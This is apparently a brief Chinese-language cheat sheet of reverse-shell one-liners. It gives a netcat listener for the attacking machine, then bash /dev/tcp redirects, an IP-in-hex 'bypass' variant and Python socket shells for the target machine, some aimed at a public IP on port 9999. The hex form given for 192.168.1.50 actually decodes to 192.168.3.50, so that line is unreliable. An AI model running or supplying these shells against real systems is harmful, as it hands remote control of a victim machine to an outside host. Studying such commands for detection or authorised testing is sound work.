# 反弹 shell

> TIME : 2024-07-22
> TAGS : Shell

攻击机为 A, ip: `192.168.1.50` ; 十六进制: `0xc0.0xa8.0x03.0x32`

目标机为 B, ip: `192.168.1.51` ; 十六进制: `0xc0.0xa8.0x03.0x33`

攻击机 A:

```bash
nc -lvvp 2333
```

## Bash

目标机 B:

```bash
bash -i >& /dev/tcp/192.168.1.50/2333 0>&1

# 或

bash -c "bash -i >& /dev/tcp/192.168.1.50/2333 0>&1"
# bash -c "bash -i >& /dev/tcp/112.124.5.76/9999 0>&1"

# 或 十六进制绕过

bash -i >& /dev/tcp/0xc0.0xa8.0x03.0x32/2333 0>&1
```

## python

目标机 B:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.50",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("112.124.5.76",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
